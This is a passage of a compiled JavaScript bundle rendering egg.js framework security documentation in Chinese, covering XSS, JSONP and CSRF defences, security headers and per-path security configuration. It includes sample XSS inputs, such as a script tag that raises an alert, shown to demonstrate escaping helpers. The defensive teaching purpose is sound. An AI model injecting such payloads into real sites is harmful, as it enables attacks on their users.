\u53c2\u6570\u6c61\u67d3\uff1a\u5229\u7528\u5bf9\u53c2\u6570\u683c\u5f0f\u9a8c\u8bc1\u7684\u4e0d\u5b8c\u5584\uff0c\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u53c2\u6570\u6ce8\u5165\u653b\u51fb\u3002"),r.a.createElement("li",null,"\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff1a\u7528\u6237\u901a\u8fc7\u6d4f\u89c8\u5668\u63d0\u4ea4\u6267\u884c\u547d\u4ee4\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u6ca1\u6709\u9488\u5bf9\u6267\u884c\u51fd\u6570\u505a\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u5728\u6ca1\u6709\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\u5c31\u6267\u884c\u547d\u4ee4\u3002")),r.a.createElement("p",null,"\u800c\u6846\u67b6\u672c\u8eab\u9488\u5bf9 Web \u7aef\u5e38\u89c1\u7684\u5b89\u5168\u98ce\u9669\u5185\u7f6e\u4e86\u4e30\u5bcc\u7684\u89e3\u51b3\u65b9\u6848\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5229\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md"},"extend")," \u673a\u5236\u6269\u5c55\u4e86 Helper API, \u63d0\u4f9b\u4e86\u5404\u79cd\u6a21\u677f\u8fc7\u6ee4\u51fd\u6570\uff0c\u9632\u6b62\u9493\u9c7c\u6216 XSS \u653b\u51fb\u3002"),r.a.createElement("li",null,"\u5e38\u89c1 Web \u5b89\u5168\u5934\u7684\u652f\u6301\u3002"),r.a.createElement("li",null,"CSRF \u7684\u9632\u5fa1\u65b9\u6848\u3002"),r.a.createElement("li",null,"\u7075\u6d3b\u7684\u5b89\u5168\u914d\u7f6e\uff0c\u53ef\u4ee5\u5339\u914d\u4e0d\u540c\u7684\u8bf7\u6c42 url \u3002"),r.a.createElement("li",null,"\u53ef\u5b9a\u5236\u7684\u767d\u540d\u5355\uff0c\u7528\u4e8e\u5b89\u5168\u8df3\u8f6c\u548c url \u8fc7\u6ee4\u3002"),r.a.createElement("li",null,"\u5404\u79cd\u6a21\u677f\u76f8\u5173\u7684\u5de5\u5177\u51fd\u6570\u505a\u9884\u5904\u7406\u3002")),r.a.createElement("p",null,"\u5728\u6846\u67b6\u4e2d\u5185\u7f6e\u4e86\u5b89\u5168\u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security"),"\uff0c \u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5b89\u5168\u5b9e\u8df5\u3002"),r.a.createElement("h3",{id:"\u5f00\u542f\u4e0e\u5173\u95ed\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u5f00\u542f\u4e0e\u5173\u95ed\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f00\u542f\u4e0e\u5173\u95ed\u914d\u7f6e"),r.a.createElement("p",null,"\u6ce8\u610f\uff1a\u9664\u975e\u6e05\u695a\u5730\u786e\u8ba4\u540e\u679c\uff0c\u5426\u5219\u4e0d\u5efa\u8bae\u64c5\u81ea\u5173\u95ed\u5b89\u5168\u63d2\u4ef6\u63d0\u4f9b\u7684\u529f\u80fd\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u7684\u5b89\u5168\u63d2\u4ef6\u662f\u9ed8\u8ba4\u5f00\u542f\u7684\uff0c\u5982\u679c\u6211\u4eec\u60f3\u5173\u95ed\u5176\u4e2d\u4e00\u4e9b\u5b89\u5168\u9632\u8303\uff0c\u76f4\u63a5\u8bbe\u7f6e\u8be5\u9879\u7684 ",r.a.createElement("code",null,"enable")," \u5c5e\u6027\u4e3a false \u5373\u53ef\u3002\u4f8b\u5982\u5173\u95ed xframe \u9632\u8303\uff1a"),r.a.createElement(o["a"],{code:"exports.security = {\n  xframe: {\n    enable: false,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"match-\u548c-ignore"},r.a.createElement(l["AnchorLink"],{to:"#match-\u548c-ignore","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"match \u548c ignore"),r.a.createElement("p",null,"match \u548c ignore \u4f7f\u7528\u65b9\u6cd5\u548c\u683c\u5f0f\u4e0e",r.a.createElement(l["AnchorLink"],{to:"../basics/middleware#match%E5%92%8Cignore"},"\u4e2d\u95f4\u4ef6\u901a\u7528\u914d\u7f6e"),"\u4e00\u81f4\u3002"),r.a.createElement("p",null,"\u5982\u679c\u53ea\u60f3\u5f00\u542f\u9488\u5bf9\u67d0\u4e00\u8def\u5f84\uff0c\u5219\u914d\u7f6e match \u9009\u9879\uff0c\u4f8b\u5982\u53ea\u9488\u5bf9 ",r.a.createElement("code",null,"/example")," \u5f00\u542f CSP\uff1a"),r.a.createElement(o["a"],{code:"exports.security = {\n  csp: {\n    match: '/example',\n    policy: {\n      //...\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u9700\u8981\u9488\u5bf9\u67d0\u4e00\u8def\u5f84\u5ffd\u7565\u67d0\u5b89\u5168\u9009\u9879\uff0c\u5219\u914d\u7f6e ignore \u9009\u9879\uff0c\u4f8b\u5982\u9488\u5bf9 ",r.a.createElement("code",null,"/example")," \u5173\u95ed xframe\uff0c\u4ee5\u4fbf\u5408\u4f5c\u5546\u6237\u80fd\u591f\u5d4c\u5165\u6211\u4eec\u7684\u9875\u9762\uff1a"),r.a.createElement(o["a"],{code:"exports.security = {\n  csp: {\n    ignore: '/example',\n    xframe: {\n      //...\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u8981\u9488\u5bf9\u5185\u90e8 ip \u5173\u95ed\u90e8\u5206\u5b89\u5168\u9632\u8303\uff1a"),r.a.createElement(o["a"],{code:"exports.security = {\n  csrf: {\n    // \u5224\u65ad\u662f\u5426\u9700\u8981 ignore \u7684\u65b9\u6cd5\uff0c\u8bf7\u6c42\u4e0a\u4e0b\u6587 context \u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\n    ignore: (ctx) => isInnerIp(ctx.ip),\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u4e0b\u9762\u6211\u4eec\u4f1a\u9488\u5bf9\u5177\u4f53\u7684\u573a\u666f\uff0c\u6765\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528\u6846\u67b6\u63d0\u4f9b\u7684\u5b89\u5168\u65b9\u6848\u8fdb\u884c Web \u5b89\u5168\u9632\u8303\u3002"),r.a.createElement("h2",{id:"\u5b89\u5168\u5a01\u80c1xss\u7684\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u5a01\u80c1xss\u7684\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u5a01\u80c1",r.a.createElement("code",null,"XSS"),"\u7684\u9632\u8303"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"},"XSS"),"\uff08cross-site scripting \u8de8\u57df\u811a\u672c\u653b\u51fb\uff09\u653b\u51fb\u662f\u6700\u5e38\u89c1\u7684 Web \u653b\u51fb\uff0c\u5176\u91cd\u70b9\u662f\u300e\u8de8\u57df\u300f\u548c\u300e\u5ba2\u6237\u7aef\u6267\u884c\u300f\u3002"),r.a.createElement("p",null,"XSS \u653b\u51fb\u4e00\u822c\u5206\u4e3a\u4e24\u7c7b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Reflected XSS\uff08\u53cd\u5c04\u578b\u7684 XSS \u653b\u51fb\uff09"),r.a.createElement("li",null,"Stored XSS\uff08\u5b58\u50a8\u578b\u7684 XSS \u653b\u51fb\uff09")),r.a.createElement("h3",{id:"reflected-xss"},r.a.createElement(l["AnchorLink"],{to:"#reflected-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Reflected XSS"),r.a.createElement("p",null,"\u53cd\u5c04\u578b\u7684 XSS \u653b\u51fb\uff0c\u4e3b\u8981\u662f\u7531\u4e8e\u670d\u52a1\u7aef\u63a5\u6536\u5230\u5ba2\u6237\u7aef\u7684\u4e0d\u5b89\u5168\u8f93\u5165\uff0c\u5728\u5ba2\u6237\u7aef\u89e6\u53d1\u6267\u884c\u4ece\u800c\u53d1\u8d77 Web \u653b\u51fb\u3002\u6bd4\u5982\uff1a"),r.a.createElement("p",null,"\u5728\u67d0\u8d2d\u7269\u7f51\u7ad9\u641c\u7d22\u7269\u54c1\uff0c\u641c\u7d22\u7ed3\u679c\u4f1a\u663e\u793a\u641c\u7d22\u7684\u5173\u952e\u8bcd\u3002\u641c\u7d22\u5173\u952e\u8bcd\u586b\u5165",r.a.createElement("code",null,"<script>alert('handsome boy')<\/script>"),", \u70b9\u51fb\u641c\u7d22\u3002\u9875\u9762\u6ca1\u6709\u5bf9\u5173\u952e\u8bcd\u8fdb\u884c\u8fc7\u6ee4\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5c31\u4f1a\u76f4\u63a5\u5728\u9875\u9762\u4e0a\u6267\u884c\uff0c\u5f39\u51fa alert\u3002"),r.a.createElement("h4",{id:"\u9632\u8303\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u9632\u8303\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9632\u8303\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"helper.escape()")," \u65b9\u6cd5\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c XSS \u8fc7\u6ee4\u3002"),r.a.createElement(o["a"],{code:"const str = '><script>alert(\"abc\") <\/script><';\nconsole.log(ctx.helper.escape(str));\n// => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;",lang:"js"}),r.a.createElement("p",null,"\u5f53\u7f51\u7ad9\u9700\u8981\u76f4\u63a5\u8f93\u51fa\u7528\u6237\u8f93\u5165\u7684\u7ed3\u679c\u65f6\uff0c\u8bf7\u52a1\u5fc5\u4f7f\u7528 ",r.a.createElement("code",null,"helper.escape()")," \u5305\u88f9\u8d77\u6765\uff0c\u5982\u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")," \u91cc\u9762\u5c31\u8986\u76d6\u6389\u4e86\u5185\u7f6e\u7684 ",r.a.createElement("code",null,"escape"),"\u3002"),r.a.createElement("p",null,"\u53e6\u5916\u4e00\u79cd\u60c5\u51b5\uff0c\u7f51\u7ad9\u8f93\u51fa\u7684\u5185\u5bb9\u4f1a\u63d0\u4f9b\u7ed9 JavaScript \u6765\u4f7f\u7528\u3002\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u4f7f\u7528 ",r.a.createElement("code",null,"helper.sjs()")," \u6765\u8fdb\u884c\u8fc7\u6ee4\u3002"),r.a.createElement("p",null,r.a.createElement("code",null,"helper.sjs()")," \u7528\u4e8e\u5728 JavaScript\uff08\u5305\u62ec onload \u7b49 event\uff09\u4e2d\u8f93\u51fa\u53d8\u91cf\uff0c\u4f1a\u5bf9\u53d8\u91cf\u4e2d\u5b57\u7b26\u8fdb\u884c JavaScript ENCODE\uff0c \u5c06\u6240\u6709\u975e\u767d\u540d\u5355\u5b57\u7b26\u8f6c\u4e49\u4e3a ",r.a.createElement("code",null,"\\x")," \u5f62\u5f0f\uff0c\u9632\u6b62 XSS \u653b\u51fb\uff0c\u4e5f\u786e\u4fdd\u5728 js \u4e2d\u8f93\u51fa\u7684\u6b63\u786e\u6027\u3002\u4f7f\u7528\u5b9e\u4f8b\uff1a"),r.a.createElement(o["a"],{code:'const foo = \'"hello"\';\n\n// \u672a\u4f7f\u7528 sjs\nconsole.log(`var foo = "${foo}";`);\n// => var foo = ""hello"";\n\n// \u4f7f\u7528 sjs\nconsole.log(`var foo = "${this.helper.sjs(foo)}";`);\n// => var foo = "\\\\x22hello\\\\x22";',lang:"js"}),r.a.createElement("p",null,"\u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\uff0c\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u5728 JavaScript \u4e2d\u8f93\u51fa json \uff0c\u82e5\u672a\u505a\u8f6c\u4e49\uff0c\u6613\u88ab\u5229\u7528\u4e3a XSS \u6f0f\u6d1e\u3002\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"helper.sjson()")," \u5b8f\u505a json encode\uff0c\u4f1a\u904d\u5386 json \u4e2d\u7684 key \uff0c\u5c06 value \u7684\u503c\u4e2d\uff0c\u6240\u6709\u975e\u767d\u540d\u5355\u5b57\u7b26\u8f6c\u4e49\u4e3a ",r.a.createElement("code",null,"\\x")," \u5f62\u5f0f\uff0c\u9632\u6b62 XSS \u653b\u51fb\u3002\u540c\u65f6\u4fdd\u6301 json \u7ed3\u6784\u4e0d\u53d8\u3002 \u82e5\u5b58\u5728\u6a21\u677f\u4e2d\u8f93\u51fa\u4e00\u4e2a JSON \u5b57\u7b26\u4e32\u7ed9 JavaScript \u4f7f\u7528\u7684\u573a\u666f\uff0c\u8bf7\u4f7f\u7528 ",r.a.createElement("code",null,"helper.sjson(\u53d8\u91cf\u540d)")," \u8fdb\u884c\u8f6c\u4e49\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5904\u7406\u8fc7\u7a0b\u8f83\u590d\u6742\uff0c\u6027\u80fd\u635f\u8017\u8f83\u5927\uff0c\u8bf7\u4ec5\u5728\u5fc5\u8981\u65f6\u4f7f\u7528\u3002")),r.a.createElement("p",null,"\u5b9e\u4f8b:"),r.a.createElement(o["a"],{code:"<script>\n  window.locals = {{ helper.sjson(locals) }};\n<\/script>",lang:"html"}),r.a.createElement("h3",{id:"stored-xss"},r.a.createElement(l["AnchorLink"],{to:"#stored-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Stored XSS"),r.a.createElement("p",null,"\u57fa\u4e8e\u5b58\u50a8\u7684 XSS \u653b\u51fb\uff0c\u662f\u901a\u8fc7\u63d0\u4ea4\u5e26\u6709\u6076\u610f\u811a\u672c\u7684\u5185\u5bb9\u5b58\u50a8\u5728\u670d\u52a1\u5668\u4e0a\uff0c\u5f53\u5176\u4ed6\u4eba\u770b\u5230\u8fd9\u4e9b\u5185\u5bb9\u65f6\u53d1\u8d77 Web \u653b\u51fb\u3002\u4e00\u822c\u63d0\u4ea4\u7684\u5185\u5bb9\u90fd\u662f\u901a\u8fc7\u4e00\u4e9b\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u7f16\u8f91\u7684\uff0c\u5f88\u5bb9\u6613\u63d2\u5165\u5371\u9669\u4ee3\u7801\u3002"),r.a.createElement("h4",{id:"\u9632\u8303\u65b9\u5f0f-1"},r.a.createElement(l["AnchorLink"],{to:"#\u9632\u8303\u65b9\u5f0f-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9632\u8303\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"helper.shtml()")," \u65b9\u6cd5\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c XSS \u8fc7\u6ee4\u3002"),r.a.createElement("p",null,"\u6ce8\u610f\uff0c\u5c06\u5bcc\u6587\u672c\uff08\u5305\u542b HTML \u4ee3\u7801\u7684\u6587\u672c\uff09\u5f53\u6210\u53d8\u91cf\u76f4\u63a5\u5728\u6a21\u7248\u91cc\u9762\u8f93\u51fa\u65f6\uff0c\u9700\u8981\u7528\u5230 shtml \u6765\u5904\u7406\u3002 \u4f7f\u7528 shtml \u53ef\u4ee5\u8f93\u51fa HTML \u7684 tag\uff0c\u540c\u65f6\u6267\u884c XSS \u7684\u8fc7\u6ee4\u52a8\u4f5c\uff0c\u8fc7\u6ee4\u6389\u975e\u6cd5\u7684\u811a\u672c\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u7531\u4e8e\u662f\u4e00\u4e2a\u975e\u5e38\u590d\u6742\u7684\u5b89\u5168\u5904\u7406\u8fc7\u7a0b\uff0c\u5bf9\u670d\u52a1\u5668\u5904\u7406\u6027\u80fd\u4e00\u5b9a\u5f71\u54cd\uff0c\u5982\u679c\u4e0d\u662f\u8f93\u51fa HTML\uff0c\u8bf7\u52ff\u4f7f\u7528\u3002")),r.a.createElement("p",null,"\u7b80\u5355\u793a\u4f8b\uff1a"),r.a.createElement(o["a"],{code:'// js\nconst value = `<a href="http://www.domain.com">google</a><script>evilcode\u2026<\/script>`;',lang:"js"}),r.a.createElement(o["a"],{code:'// \u6a21\u677f\n<html>\n  <body>\n    {{ helper.shtml(value) }}\n  </body>\n</html>\n// =>\n<a href="http://www.domain.com">google</a>&lt;script&gt;evilcode\u2026&lt;/script&gt;',lang:"html"}),r.a.createElement("p",null,"shtml \u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/leizongmin/js-xss/"},"xss")," \u6a21\u5757\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u9488\u5bf9\u57df\u540d\u7684\u8fc7\u6ee4\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/leizongmin/js-xss/blob/master/lib/default.js"},"\u9ed8\u8ba4\u89c4\u5219")),r.a.createElement("li",null,"\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u9879\uff1a ",r.a.createElement(l["Link"],{to:"http://jsxss.com/zh/options.html"},"http://jsxss.com/zh/options.html"))),r.a.createElement("p",null,"\u4f8b\u5982\u53ea\u652f\u6301 a \u6807\u7b7e\uff0c\u4e14\u9664\u4e86 title \u5176\u4ed6\u5c5e\u6027\u90fd\u8fc7\u6ee4\u6389\uff1a ",r.a.createElement("code",null,"whiteList: ","{","a: ['title']","}")),r.a.createElement("p",null,"options:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"config.helper.shtml.domainWhiteList: []")," \u53ef\u62d3\u5c55 href \u548c src \u4e2d\u5141\u8bb8\u7684\u57df\u540d\u767d\u540d\u5355\u3002")),r.a.createElement("p",null,"\u6ce8\u610f\uff0cshtml \u4f7f\u7528\u4e86\u4e25\u683c\u7684\u767d\u540d\u5355\u673a\u5236\uff0c\u9664\u4e86\u8fc7\u6ee4\u6389 XSS \u98ce\u9669\u7684\u5b57\u7b26\u4e32\u5916\uff0c \u5728",r.a.createElement(l["Link"],{to:"https://github.com/leizongmin/js-xss/blob/master/lib/default.js"},"\u9ed8\u8ba4\u89c4\u5219"),"\u5916\u7684 tag \u548c attr \u90fd\u4f1a\u88ab\u8fc7\u6ee4\u6389\u3002"),r.a.createElement("p",null,"\u4f8b\u5982 HTML \u6807\u7b7e\u5c31\u4e0d\u5728\u767d\u540d\u5355\u4e2d\uff0c"),r.a.createElement(o["a"],{code:"const html = '<html></html>';\n\n// html\n{\n  {\n    helper.shtml(html);\n  }\n}\n\n// \u8f93\u51fa\u7a7a",lang:"js"}),r.a.createElement("p",null,"\u5e38\u89c1\u7684 ",r.a.createElement("code",null,"data-xx")," \u5c5e\u6027\u7531\u4e8e\u4e0d\u5728\u767d\u540d\u5355\u4e2d\uff0c\u6240\u4ee5\u90fd\u4f1a\u88ab\u8fc7\u6ee4\u3002"),r.a.createElement("p",null,"\u6240\u4ee5\uff0c\u4e00\u5b9a\u8981\u6ce8\u610f shtml \u7684\u9002\u7528\u573a\u666f\uff0c\u4e00\u822c\u662f\u9488\u5bf9\u6765\u81ea\u7528\u6237\u7684\u5bcc\u6587\u672c\u8f93\u5165\uff0c\u5207\u5fcc\u6ee5\u7528\uff0c\u529f\u80fd\u65e2\u53d7\u5230\u9650\u5236\uff0c\u53c8\u4f1a\u5f71\u54cd\u670d\u52a1\u7aef\u6027\u80fd\u3002 \u6b64\u7c7b\u573a\u666f\u4e00\u822c\u662f\u8bba\u575b\u3001\u8bc4\u8bba\u7cfb\u7edf\u7b49\uff0c\u5373\u4fbf\u662f\u8bba\u575b\u7b49\u5982\u679c\u4e0d\u652f\u6301 HTML \u5185\u5bb9\u8f93\u5165\uff0c\u4e5f\u4e0d\u8981\u4f7f\u7528\u6b64 Helper\uff0c\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"escape")," \u5373\u53ef\u3002"),r.a.createElement("h3",{id:"jsonp-xss"},r.a.createElement(l["AnchorLink"],{to:"#jsonp-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSONP XSS"),r.a.createElement("p",null,"JSONP \u7684 callback \u53c2\u6570\u975e\u5e38\u5371\u9669\uff0c\u4ed6\u6709\u4e24\u79cd\u98ce\u9669\u53ef\u80fd\u5bfc\u81f4 XSS"),r.a.createElement("p",null,"1\u3001callback \u53c2\u6570\u610f\u5916\u622a\u65ad js \u4ee3\u7801\uff0c\u7279\u6b8a\u5b57\u7b26\u5355\u5f15\u53f7\u53cc\u5f15\u53f7\uff0c\u6362\u884c\u7b26\u5747\u5b58\u5728\u98ce\u9669\u3002"),r.a.createElement("p",null,"2\u3001callback \u53c2\u6570\u6076\u610f\u6dfb\u52a0\u6807\u7b7e\uff08\u5982 ",r.a.createElement("code",null,"<script>")," \uff09\uff0c\u9020\u6210 XSS \u6f0f\u6d1e\u3002"),r.a.createElement("p",null,"\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"http://blog.knownsec.com/2015/03/jsonp_security_technic/"},"JSONP \u5b89\u5168\u653b\u9632")),r.a.createElement("p",null,"\u6846\u67b6\u5185\u90e8\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/jsonp-body"},"jsonp-body")," \u6765\u5bf9 JSONP \u8bf7\u6c42\u8fdb\u884c\u5b89\u5168\u9632\u8303\u3002"),r.a.createElement("p",null,"\u9632\u5fa1\u5185\u5bb9\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"callback \u51fd\u6570\u540d\u8bcd\u6700\u957f 50 \u4e2a\u5b57\u7b26\u9650\u5236"),r.a.createElement("li",null,"callback \u51fd\u6570\u540d\u53ea\u5141\u8bb8 ",r.a.createElement("code",null,"["),", ",r.a.createElement("code",null,"]"),", ",r.a.createElement("code",null,"a-zA-Z0123456789_"),", ",r.a.createElement("code",null,"$"),", ",r.a.createElement("code",null,"."),"\uff0c\u9632\u6b62\u4e00\u822c\u7684 XSS\uff0cutf-7 XSS \u7b49\u653b\u51fb\u3002")),r.a.createElement("p",null,"\u53ef\u5b9a\u4e49\u914d\u7f6e\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"callback \u9ed8\u8ba4 ",r.a.createElement("code",null,"_callback"),"\uff0c\u53ef\u4ee5\u91cd\u547d\u540d\u3002"),r.a.createElement("li",null,"limit - \u51fd\u6570\u540d length \u9650\u5236\uff0c\u9ed8\u8ba4 50\u3002")),r.a.createElement("h3",{id:"\u5176\u4ed6-xss-\u7684\u9632\u8303\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u5176\u4ed6-xss-\u7684\u9632\u8303\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5176\u4ed6 XSS \u7684\u9632\u8303\u65b9\u5f0f"),r.a.createElement("p",null,"\u6d4f\u89c8\u5668\u81ea\u8eab\u5177\u6709\u4e00\u5b9a\u9488\u5bf9\u5404\u79cd\u653b\u51fb\u7684\u9632\u8303\u80fd\u529b\uff0c\u4ed6\u4eec\u4e00\u822c\u662f\u901a\u8fc7\u5f00\u542f Web \u5b89\u5168\u5934\u751f\u6548\u7684\u3002\u6846\u67b6\u5185\u7f6e\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684 Web \u5b89\u5168\u5934\u7684\u652f\u6301\u3002"),r.a.createElement("h4",{id:"csp"},r.a.createElement(l["AnchorLink"],{to:"#csp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"CSP"),r.a.createElement("p",null,"W3C \u7684 Content Security Policy\uff0c\u7b80\u79f0 CSP\uff0c\u4e3b\u8981\u662f\u7528\u6765\u5b9a\u4e49\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u54ea\u4e9b\u8d44\u6e90\uff0c\u51cf\u5c11 XSS \u7684\u53d1\u751f\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u652f\u6301 CSP \u7684\u914d\u7f6e\uff0c\u4e0d\u8fc7\u662f\u9ed8\u8ba4\u5173\u95ed\u7684\uff0c\u5f00\u542f\u540e\u53ef\u4ee5\u6709\u6548\u7684\u9632\u6b62 XSS \u653b\u51fb\u7684\u53d1\u751f\u3002\u8981\u914d\u7f6e CSP , \u9700\u8981\u5bf9 CSP \u7684 policy \u7b56\u7565\u6709\u4e86\u89e3\uff0c\u5177\u4f53\u7ec6\u8282\u53ef\u4ee5\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://www.zhihu.com/question/21979782"},"CSP \u662f\u4ec0\u4e48"),"\u3002"),r.a.createElement("h4",{id:"x-download-optionsnoopen"},r.a.createElement(l["AnchorLink"],{to:"#x-download-optionsnoopen","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"X-Download-Options:noopen"),r.a.createElement("p",null,"\u9ed8\u8ba4\u5f00\u542f\uff0c\u7981\u7528 IE \u4e0b\u4e0b\u8f7d\u6846 Open \u6309\u94ae\uff0c\u9632\u6b62 IE \u4e0b\u4e0b\u8f7d\u6587\u4ef6\u9ed8\u8ba4\u88ab\u6253\u5f00 XSS\u3002"),r.a.createElement("h4",{id:"x-content-type-optionsnosniff"},r.a.createElement(l["AnchorLink"],{to:"#x-content-type-optionsnosniff","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"X-Content-Type-Options:nosniff"),r.a.createElement("p",null,"\u7981\u7528 IE8 \u81ea\u52a8\u55c5\u63a2 mime \u529f\u80fd\u4f8b\u5982 ",r.a.createElement("code",null,"text/plain")," \u5374\u5f53\u6210 ",r.a.createElement("code",null,"text/html")," \u6e32\u67d3\uff0c\u7279\u522b\u5f53\u672c\u7ad9\u70b9 serve \u7684\u5185\u5bb9\u672a\u5fc5\u53ef\u4fe1\u7684\u65f6\u5019\u3002"),r.a.createElement("h4",{id:"x-xss-protection"},r.a.createElement(l["AnchorLink"],{to:"#x-xss-protection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"X-XSS-Protection"),r.a.createElement("p",null,"IE \u63d0\u4f9b\u7684\u4e00\u4e9b XSS \u68c0\u6d4b\u4e0e\u9632\u8303\uff0c\u9ed8\u8ba4\u5f00\u542f"),r.a.createElement("ul",null,r.a.createElement("li",null,"close \u9ed8\u8ba4\u503c false\uff0c\u5373\u8bbe\u7f6e\u4e3a ",r.a.createElement("code",null,"1; mode=block"))),r.a.createElement("h2",{id:"\u5b89\u5168\u5a01\u80c1-csrf-\u7684\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u5a01\u80c1-csrf-\u7684\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u5a01\u80c1 CSRF \u7684\u9632\u8303"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/CSRF"},"CSRF"),"\uff08Cross-site request forgery\uff09\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u4e5f\u88ab\u79f0\u4e3a ",r.a.createElement("code",null,"One Click Attack")," \u6216\u8005 ",r.a.createElement("code",null,"Session Riding"),"\uff0c\u901a\u5e38\u7f29\u5199\u4e3a CSRF \u6216\u8005 XSRF\uff0c\u662f\u4e00\u79cd\u5bf9\u7f51\u7ad9\u7684\u6076\u610f\u5229\u7528\u3002 CSRF \u653b\u51fb\u4f1a\u5bf9\u7f51\u7ad9\u53d1\u8d77\u6076\u610f\u4f2a\u9020\u7684\u8bf7\u6c42\uff0c\u4e25\u91cd\u5f71\u54cd\u7f51\u7ad9\u7684\u5b89\u5168\u3002\u56e0\u6b64\u6846\u67b6\u5185\u7f6e\u4e86 CSRF \u9632\u8303\u65b9\u6848\u3002"),r.a.createElement("h3",{id:"\u9632\u8303\u65b9\u5f0f-2"},r.a.createElement(l["AnchorLink"],{to:"#\u9632\u8303\u65b9\u5f0f-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9632\u8303\u65b9\u5f0f"),r.a.createElement("p",null,"\u901a\u5e38\u6765\u8bf4\uff0c\u5bf9\u4e8e CSRF \u653b\u51fb\u6709\u4e00\u4e9b\u901a\u7528\u7684",r.a.createElement(l["Link"],{to:"https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"},"\u9632\u8303\u65b9\u6848"),"\uff0c\u7b80\u5355\u7684\u4ecb\u7ecd\u51e0\u79cd\u5e38\u7528\u7684\u9632\u8303\u65b9\u6848\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Synchronizer Tokens\uff1a\u901a\u8fc7\u54cd\u5e94\u9875\u9762\u65f6\u5c06 token \u6e32\u67d3\u5230\u9875\u9762\u4e0a\uff0c\u5728 form 